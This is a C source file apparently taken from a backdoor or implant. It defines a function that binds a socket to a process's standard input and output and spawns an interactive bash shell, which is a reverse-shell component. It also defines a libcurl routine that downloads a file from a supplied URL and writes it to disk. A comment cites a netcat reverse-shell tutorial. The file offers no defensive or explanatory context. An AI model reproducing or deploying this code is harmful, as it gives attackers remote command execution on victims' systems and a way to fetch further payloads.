#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <curl/curl.h>

void shell(int sockfd){
  pid_t c_pid, w_pid;
  int status;

  c_pid = fork();

  if (c_pid > 0){  //parent
    while((w_pid = wait(&status)) > 0){}
    /*
    if( (pid = wait(&status)) < 0){
      perror("wait");
    }*/
  }else if( c_pid == 0 ){  //child
    for (int i = 0; i < 3; i++)
    {
        dup2(sockfd, i);
    }
    
    char * args[3];
		args[0] = "/bin/bash";
		args[1] = "-i";
		args[2] = '\0';
		execve(args[0], args, NULL);
    
    //execve("/bin/sh", NULL, NULL);
    perror("execv failed");  //only get here if exec failed
  }
  else{  //error: The return of fork() is negative
    perror("fork failed");
    _exit(2);
  }
}

static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
{
  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
  return written;
}

void curlDown(char* url, char* givenName){
  //https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-reverse-shell.jpg
  CURL *curl_handle;
  char *pagefilename = givenName;
  FILE *pagefile;

  curl_global_init(CURL_GLOBAL_ALL);
  /* init the curl session */
  curl_handle = curl_easy_init();
  /* set URL to get here */
  curl_easy_setopt(curl_handle, CURLOPT_URL, url);
  /* Switch on full protocol/debug output while testing */
  curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 1L);
  /* disable progress meter, set to 0L to enable it */
  curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
  /* send all data to this function  */
  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);
  /* open the file */
  pagefile = fopen(pagefilename, "wb");
  if(pagefile) {
    /* write the page body to this file handle */
    curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, pagefile);
    /* get it! */
    curl_easy_perform(curl_handle);
    /* close the header file */
    fclose(pagefile);
  }
  /* cleanup curl stuff */
  curl_easy_cleanup(curl_handle);
  curl_global_cleanup();
}
